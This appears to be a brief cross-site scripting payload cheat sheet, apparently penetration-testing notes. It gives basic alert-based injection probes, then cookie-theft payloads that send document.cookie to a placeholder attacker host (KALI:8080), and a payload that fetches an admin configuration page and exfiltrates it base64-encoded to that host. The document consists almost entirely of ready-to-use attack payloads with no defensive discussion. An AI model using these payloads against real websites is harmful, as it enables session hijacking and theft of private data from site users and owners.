# Cross-Site Scripting (XSS)

## Basic Tests

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
```

## Cookie Theft

```html
<script>new Image().src="http://KALI:8080/?c="+document.cookie</script>
<script>fetch('http://KALI:8080/?c='+document.cookie)</script>
```

## Page Content Exfiltration

```html
<script>fetch('/admin/config').then(r=>r.text()).then(t=>fetch('http://KALI:8080/?d='+btoa(t)))</script>
```
